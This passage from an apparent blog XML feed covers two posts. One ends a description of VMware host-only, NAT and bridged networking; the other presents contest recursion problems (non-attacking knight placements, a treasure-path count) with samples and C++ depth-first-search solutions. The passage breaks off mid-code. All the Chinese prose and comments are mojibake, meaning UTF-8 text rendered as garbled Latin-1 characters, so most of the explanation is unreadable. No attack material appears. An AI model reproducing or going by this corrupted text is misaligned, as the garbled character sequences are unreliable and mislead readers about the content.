åœ°æ–¹å°±æ˜¯Host-Onlyç½‘ç»œæ²¡æœ‰NATæœåŠ¡ï¼Œæ‰€ä»¥è™šæ‹Ÿç½‘ç»œä¸èƒ½è¿æ¥åˆ°Internetã€‚ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´çš„é€šä¿¡æ˜¯é€šè¿‡VMware Network Adepter VMnet1è™šæ‹Ÿç½‘å¡æ¥å®ç°çš„ã€‚</p><p><img src="/2022/03/31/vmware-shi-yong-shuo-ming/clip_image001-16487106380803.jpg" alt="ä»…ä¸»æœºæ¨¡å¼"></p><p>åŒNATä¸€æ ·ï¼ŒVMware Network Adepter VMnet1è™šæ‹Ÿç½‘å¡çš„IPåœ°å€ä¹Ÿæ˜¯VMwareç³»ç»ŸæŒ‡å®šçš„ï¼ŒåŒæ—¶ç”Ÿæˆçš„è™šæ‹ŸDHCPæœåŠ¡å™¨å’Œè™šæ‹Ÿç½‘å¡çš„IPåœ°å€ä½äºåŒä¸€ç½‘æ®µï¼Œä½†å’Œç‰©ç†ç½‘å¡çš„IPåœ°å€ä¸åœ¨åŒä¸€ç½‘æ®µã€‚</p><p>Host-Onlyçš„å®—æ—¨å°±æ˜¯å»ºç«‹ä¸€ä¸ªä¸å¤–ç•Œéš”ç»çš„å†…éƒ¨ç½‘ç»œï¼Œæ¥æé«˜å†…ç½‘çš„å®‰å…¨æ€§ã€‚è¿™ä¸ªåŠŸèƒ½æˆ–è®¸å¯¹æ™®é€šç”¨æˆ·æ¥è¯´æ²¡æœ‰å¤šå¤§æ„ä¹‰ï¼Œä½†å¤§å‹æœåŠ¡å•†ä¼šå¸¸ å¸¸åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½ã€‚å¦‚æœä½ æƒ³ä¸ºVMnet1ç½‘æ®µæä¾›è·¯ç”±åŠŸèƒ½ï¼Œé‚£å°±éœ€è¦ä½¿ç”¨RRASï¼Œè€Œä¸èƒ½ä½¿ç”¨XPæˆ–2000çš„ICSï¼Œå› ä¸ºICSä¼šæŠŠå†…ç½‘çš„IPåœ°å€æ”¹ä¸º 192.168.0.1ï¼Œä½†è™šæ‹Ÿæœºæ˜¯ä¸ä¼šç»™VMnet1è™šæ‹Ÿç½‘å¡åˆ†é…è¿™ä¸ªåœ°å€çš„ï¼Œé‚£ä¹ˆä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´å°±ä¸èƒ½é€šä¿¡äº†ã€‚</p><h4 id="ç»¼è¿°"><a href="#ç»¼è¿°" class="headerlink" title="ç»¼è¿°"></a>ç»¼è¿°</h4><p>åœ¨VMwareçš„3ä¸­ç½‘ç»œæ¨¡å¼ä¸­ï¼ŒNATæ¨¡å¼æ˜¯æœ€ç®€å•çš„ï¼ŒåŸºæœ¬ä¸éœ€è¦æ‰‹åŠ¨é…ç½®IPåœ°å€ç­‰ç›¸å…³å‚æ•°ã€‚è‡³äºæ¡¥æ¥æ¨¡å¼åˆ™éœ€è¦é¢å¤–çš„IPåœ°å€ï¼Œå¦‚æœæ˜¯åœ¨å†…ç½‘ç¯å¢ƒä¸­è¿˜å¾ˆå®¹æ˜“ï¼Œå¦‚æœæ˜¯ADSLå®½å¸¦å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼ŒISPä¸€èˆ¬æ˜¯ä¸ä¼šå¤§æ–¹çš„å¤šæä¾›ä¸€ä¸ªå…¬ç½‘IPçš„ã€‚ </p><h4 id="é€šä¿—ç†è§£ï¼š"><a href="#é€šä¿—ç†è§£ï¼š" class="headerlink" title="é€šä¿—ç†è§£ï¼š"></a>é€šä¿—ç†è§£ï¼š</h4><table><thead><tr><th>æ¨¡å¼</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>NATæ¨¡å¼</td><td>ä¸åœ¨ä¸€ä¸ªç½‘æ®µå†… èƒ½ä¸Šç½‘ ä¹Ÿèƒ½è®¿é—®å†…ç½‘å…¶ä»–æœºå™¨ï¼Œä½†æ˜¯å…¶ä»–æœºå­è®¿é—®ä¸äº†ã€‚</td></tr><tr><td>Hostæ¨¡å¼</td><td>ç‰©ç†æœºèƒ½è®¿é—®ã€‚ä¸èƒ½ä¸ä¸Šç½‘ ä¸èƒ½è®¿é—®å±€åŸŸç½‘å…¶ä»–æœºå­ã€‚</td></tr><tr><td>æ¡¥æ¥æ¨¡å¼</td><td>åŒä¸€ä¸ªç½‘æ®µå†…è®¿é—® èƒ½è®¿é—®äº’è”ç½‘ã€‚</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> å·¥å…·è¯´æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€’å½’ç®—æ³•ï¼ˆäºŒï¼‰</title>
      <link href="/2022/03/30/di-gui-suan-fa-er/"/>
      <url>/2022/03/30/di-gui-suan-fa-er/</url>
      
        <content type="html"><![CDATA[<h2 id="å›½é™…è±¡æ£‹"><a href="#å›½é™…è±¡æ£‹" class="headerlink" title="å›½é™…è±¡æ£‹"></a>å›½é™…è±¡æ£‹</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œâ€œå…«çš‡åâ€ é—®é¢˜æ˜¯æ±‚è§£åœ¨å›½é™…è±¡æ£‹æ£‹ç›˜ä¸Šæ‘†æ”¾ $8$ ä¸ªçš‡åï¼Œä½¿å¾—ä¸¤ä¸¤ä¹‹é—´äº’ä¸æ”»å‡»çš„æ–¹æ¡ˆæ•°ã€‚</p><p>å·²ç»å­¦ä¹ äº†å¾ˆå¤šç®—æ³•çš„å°è“è§‰å¾— â€œå…«çš‡åâ€ é—®é¢˜å¤ªç®€å•äº†ï¼Œæ„çŠ¹æœªå°½ã€‚ä½œä¸ºä¸€ä¸ªå›½é™…è±¡æ£‹è¿·ï¼Œä»–æƒ³ç ”ç©¶åœ¨ $N \times M$ çš„æ£‹ç›˜ä¸Šï¼Œæ‘†æ”¾ $K$ ä¸ªé©¬ï¼Œä½¿å¾—ä¸¤ä¸¤ä¹‹é—´äº’ä¸æ”»å‡»æœ‰å¤šå°‘ç§æ‘†æ”¾æ–¹æ¡ˆã€‚</p><p>ç”±äºæ–¹æ¡ˆæ•°å¯èƒ½å¾ˆå¤§ï¼Œåªéœ€è®¡ç®—ç­”æ¡ˆé™¤ä»¥ $1000000007$ (å³ $10^9 + 7$) çš„ä½™æ•°ã€‚</p><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå›½é™…è±¡æ£‹ä¸­çš„é©¬æ‘†æ”¾åœ¨æ£‹ç›˜çš„æ–¹æ ¼å†…ï¼Œèµ° â€œæ—¥â€ å­—ï¼Œä½äº $(x, y)$ æ ¼çš„é©¬ï¼ˆç¬¬ $x$ è¡Œç¬¬ $y$ åˆ—ï¼‰å¯ä»¥æ”»å‡» $(x + 1, y + 2)$ã€$(x + 1, y âˆ’ 2)$ã€$(x âˆ’ 1, y + 2)$ã€$(x âˆ’ 1, y âˆ’ 2)$ã€$(x + 2, y + 1)$ã€$(x + 2, y âˆ’ 1)$ã€$(x âˆ’ 2, y + 1)$ å’Œ $(x âˆ’ 2, y âˆ’ 1)$ å…± $8$ ä¸ªæ ¼å­ã€‚</p><img src="19_3c6f425bb2-QQæˆªå›¾20210512104039.png" style="zoom:80%;"><h4 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥ä¸€è¡ŒåŒ…å«ä¸‰ä¸ªæ­£æ•´æ•° $N, M, K$ï¼Œåˆ†åˆ«è¡¨ç¤ºæ£‹ç›˜çš„è¡Œæ•°ã€åˆ—æ•°å’Œé©¬çš„ä¸ªæ•°ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ‘†æ”¾çš„æ–¹æ¡ˆæ•°é™¤ä»¥ $1000000007$ (å³ $10^9 + 7$) çš„ä½™æ•°ã€‚</p><h4 id="æ•°æ®èŒƒå›´"><a href="#æ•°æ®èŒƒå›´" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>å¯¹äº $5%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$K = 1$ï¼›<br>å¯¹äºå¦å¤– $10%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$K = 2$ï¼›<br>å¯¹äºå¦å¤– $10%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$N = 1$ï¼›<br>å¯¹äºå¦å¤– $20%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$N, M â‰¤ 6ï¼ŒK â‰¤ 5$ï¼›<br>å¯¹äºå¦å¤– $25%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$N â‰¤ 3ï¼ŒM â‰¤ 20ï¼ŒK â‰¤ 12$ï¼›<br>å¯¹äºæ‰€æœ‰è¯„æµ‹ç”¨ä¾‹ï¼Œ$1 â‰¤ N â‰¤ 6ï¼Œ1 â‰¤ M â‰¤ 100ï¼Œ1 â‰¤ K â‰¤ 20$ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹1ï¼š"><a href="#è¾“å…¥æ ·ä¾‹1ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹1ï¼š"></a>è¾“å…¥æ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">1 2 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹1ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹1ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹1ï¼š"></a>è¾“å‡ºæ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å…¥æ ·ä¾‹2ï¼š"><a href="#è¾“å…¥æ ·ä¾‹2ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹2ï¼š"></a>è¾“å…¥æ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">4 4 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹2ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹2ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹2ï¼š"></a>è¾“å‡ºæ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">276<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å…¥æ ·ä¾‹3ï¼š"><a href="#è¾“å…¥æ ·ä¾‹3ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹3ï¼š"></a>è¾“å…¥æ ·ä¾‹3ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3 20 12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹3ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹3ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹3ï¼š"></a>è¾“å‡ºæ ·ä¾‹3ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">914051446<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š"><a href="#é¢˜è§£ï¼š" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>è¿™é“é¢˜æ­£è§£ç”¨çŠ¶æ€å‹ç¼© $dp$ï¼ˆæ·±æœæ±‚æ–¹æ¡ˆæ•°çš„åŸºæœ¬ä¸Šå¯ä»¥ç”¨ $dp$ æ¥æ›´å¿«çš„è§£å†³ï¼Œæ¯•ç«Ÿç©ºé—´æ¢æ—¶é—´å˜›ï¼‰ï¼Œè¿™é‡Œä½¿ç”¨æš´åŠ›æ·±æœï¼Œè™½ç„¶åªèƒ½è¿‡ä¸€åŠï¼Œä½†æ˜¯å¯ä»¥å¾ˆå¥½çš„è®­ç»ƒæ·±æœå›æº¯ç®—æ³•ã€‚</p><p>æ·±æœæ ‘å°±æ˜¯å…«ä¸ªåˆ†æ”¯ï¼ˆå¯¹åº”å…«ä¸ªæ–¹å‘ï¼‰ã€‚dfså‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ¨ªçºµåæ ‡ï¼Œå½“å‰æ”¾äº†å¤šå°‘é©¬ã€‚</p><p>å¯¹äºé€’å½’å‡ºå£æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯æˆ‘èµ°åˆ°æœ€åä¸€è¡Œäº†ï¼Œä¸èƒ½å¾€ä¸‹èµ°è·¯ï¼Œä½†è¿˜æ²¡æœ‰æ”¾åˆ° $k$ ä¸ªé©¬çš„æ•°é‡ï¼›ç¬¬äºŒä¸ªå°±æ˜¯æˆ‘æ”¾åˆ°äº† $k$ ä¸ªé©¬çš„æ•°é‡ã€‚å½“ç„¶è¿˜è¦å›æº¯å°†æ”¾é©¬çš„åœ°æ–¹è¿˜åŸå‡ºæ¥ï¼ˆç”¨ä¸ªboolæ•°ç»„å°±å¯ä»¥äº†ï¼‰ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">long</span> <span class="token keyword">long</span> LL<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">110</span><span class="token punctuation">,</span>mod<span class="token operator">=</span><span class="token number">1e9</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">;</span><span class="token keyword">int</span> cnt<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> dx<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> dy<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">,</span>k<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">,</span><span class="token keyword">int</span> sum<span class="token punctuation">)</span><span class="token comment">//åˆ†åˆ«æšä¸¾æ£‹ç›˜çš„æ¯ä¸ªä½ç½®æ”¾é©¬æˆ–ä¸æ”¾é©¬ã€‚</span><span class="token punctuation">{</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>sum<span class="token operator">==</span>k<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        res<span class="token operator">=</span><span class="token punctuation">(</span>res<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>mod<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>y<span class="token operator">&gt;</span>m<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        y<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>x<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">&gt;</span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//(x,y)ä¸æ”¾é©¬</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>cnt<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">//å¦‚æœ(x,y)å¯ä»¥æ”¾é©¬ï¼Œå°±æ”¾é©¬</span>    <span class="token punctuation">{</span>    <span class="token comment">//æ›´æ–°ä¸€ä¸‹çŠ¶æ€(åœ¨(x,y)å¤„æ”¾é©¬åï¼Œå“ªäº›ä½ç½®ä¸èƒ½æ”¾é©¬äº†)</span>        cnt<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> a<span class="token operator">=</span>x<span class="token operator">+</span>dx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token operator">=</span>y<span class="token operator">+</span>dy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">||</span>a<span class="token operator">&gt;</span>n<span class="token operator">||</span>b<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">||</span>b<span class="token operator">&gt;</span>m<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            cnt<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>sum<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ”¾é©¬åï¼Œé©¬çš„æ•°é‡sumè¦ +1</span>    <span class="token comment">//æ¢å¤ç°åœº</span>        cnt<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> a<span class="token operator">=</span>x<span class="token operator">+</span>dx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token operator">=</span>y<span class="token operator">+</span>dy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">||</span>a<span class="token operator">&gt;</span>n<span class="token operator">||</span>b<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">||</span>b<span class="token operator">&gt;</span>m<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            cnt<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>m<span class="token operator">&gt;&gt;</span>k<span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä»ï¼ˆ1ï¼Œ1ï¼‰è¿™ä¸ªä½ç½®å¼€å§‹æ”¾é©¬ï¼Œæœ€å¼€å§‹æ€»å…±æ”¾äº†0ä¸ªé©¬</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="åœ°å®«å–å®"><a href="#åœ°å®«å–å®" class="headerlink" title="åœ°å®«å–å®"></a>åœ°å®«å–å®</h2><p>X å›½ç‹æœ‰ä¸€ä¸ªåœ°å®«å®åº“ï¼Œæ˜¯ $n \times m$ ä¸ªæ ¼å­çš„çŸ©é˜µï¼Œæ¯ä¸ªæ ¼å­æ”¾ä¸€ä»¶å®è´ï¼Œæ¯ä¸ªå®è´è´´ç€ä»·å€¼æ ‡ç­¾ã€‚</p><p>åœ°å®«çš„å…¥å£åœ¨å·¦ä¸Šè§’ï¼Œå‡ºå£åœ¨å³ä¸‹è§’ã€‚</p><p>å°æ˜è¢«å¸¦åˆ°åœ°å®«çš„å…¥å£ï¼Œå›½ç‹è¦æ±‚ä»–åªèƒ½å‘å³æˆ–å‘ä¸‹è¡Œèµ°ã€‚</p><p>èµ°è¿‡æŸä¸ªæ ¼å­æ—¶ï¼Œå¦‚æœé‚£ä¸ªæ ¼å­ä¸­çš„å®è´ä»·å€¼æ¯”å°æ˜æ‰‹ä¸­ä»»æ„å®è´ä»·å€¼éƒ½å¤§ï¼Œå°æ˜å°±å¯ä»¥æ‹¿èµ·å®ƒï¼ˆå½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä¸æ‹¿ï¼‰ã€‚</p><p>å½“å°æ˜èµ°åˆ°å‡ºå£æ—¶ï¼Œå¦‚æœä»–æ‰‹ä¸­çš„å®è´æ°å¥½æ˜¯ $k$ ä»¶ï¼Œåˆ™è¿™äº›å®è´å°±å¯ä»¥é€ç»™å°æ˜ã€‚</p><p>è¯·ä½ å¸®å°æ˜ç®—ä¸€ç®—ï¼Œåœ¨ç»™å®šçš„å±€é¢ä¸‹ï¼Œä»–æœ‰å¤šå°‘ç§ä¸åŒçš„è¡ŒåŠ¨æ–¹æ¡ˆèƒ½è·å¾—è¿™ $k$ ä»¶å®è´ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-1"><a href="#è¾“å…¥æ ¼å¼-1" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡Œ $3$ ä¸ªæ•´æ•°ï¼Œ$n,m,k$ï¼Œå«ä¹‰è§é¢˜ç›®æè¿°ã€‚</p><p>æ¥ä¸‹æ¥ $n$ è¡Œï¼Œæ¯è¡Œæœ‰ $m$ ä¸ªæ•´æ•° $C_i$ ç”¨æ¥æè¿°å®åº“çŸ©é˜µæ¯ä¸ªæ ¼å­çš„å®è´ä»·å€¼ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-1"><a href="#è¾“å‡ºæ ¼å¼-1" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ­£å¥½å– $k$ ä¸ªå®è´çš„è¡ŒåŠ¨æ–¹æ¡ˆæ•°ã€‚</p><p>è¯¥æ•°å­—å¯èƒ½å¾ˆå¤§ï¼Œè¾“å‡ºå®ƒå¯¹ $1000000007$ å–æ¨¡çš„ç»“æœã€‚</p><h4 id="æ•°æ®èŒƒå›´-1"><a href="#æ•°æ®èŒƒå›´-1" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$1 \le n,m \le 50$,<br>$1 \le k \le 12$,<br>$0 \le C_i \le 12$</p><h4 id="è¾“å…¥æ ·ä¾‹1ï¼š-1"><a href="#è¾“å…¥æ ·ä¾‹1ï¼š-1" class="headerlink" title="è¾“å…¥æ ·ä¾‹1ï¼š"></a>è¾“å…¥æ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2 2 21 22 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹1ï¼š-1"><a href="#è¾“å‡ºæ ·ä¾‹1ï¼š-1" class="headerlink" title="è¾“å‡ºæ ·ä¾‹1ï¼š"></a>è¾“å‡ºæ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å…¥æ ·ä¾‹2ï¼š-1"><a href="#è¾“å…¥æ ·ä¾‹2ï¼š-1" class="headerlink" title="è¾“å…¥æ ·ä¾‹2ï¼š"></a>è¾“å…¥æ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2 3 21 2 32 1 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹2ï¼š-1"><a href="#è¾“å‡ºæ ·ä¾‹2ï¼š-1" class="headerlink" title="è¾“å‡ºæ ·ä¾‹2ï¼š"></a>è¾“å‡ºæ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š-1"><a href="#é¢˜è§£ï¼š-1" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>è¿˜æ˜¯ä¸€æ ·ï¼Œé€’å½’æ±‚æ–¹æ¡ˆæ•°ï¼Œè¿˜æ˜¯å¯ä»¥ç”¨dpè§£å†³ã€‚ä½†æ˜¯è¿™é‡Œæ•°æ®å°ï¼Œdfsä¹Ÿå¯ä»¥ACã€‚</p><p>æ¯æ­¥çš„æ•°æ®æ˜¯åæ ‡ä½ç½®ã€æ‰‹ä¸­ç‰©å“æ•°é‡ã€å½“å‰ç‰©å“ä»·å€¼çš„æœ€å¤§å€¼ï¼Œå› æ­¤dfså‡½æ•°æœ‰å››ä¸ªå‚æ•°</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">55</span><span class="token punctuation">;</span><span class="token keyword">int</span> g<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">,</span>k<span class="token punctuation">;</span><span class="token keyword">int</span> res<span class="token punctuation">;</span><span class="token keyword">int</span> MOD <span class="token operator">=</span> <span class="token number">1000000007</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">,</span><span class="token keyword">int</span> cnt<span class="token punctuation">,</span><span class="token keyword">int</span> value<span class="token punctuation">)</span>   <span class="token comment">//x,yåæ 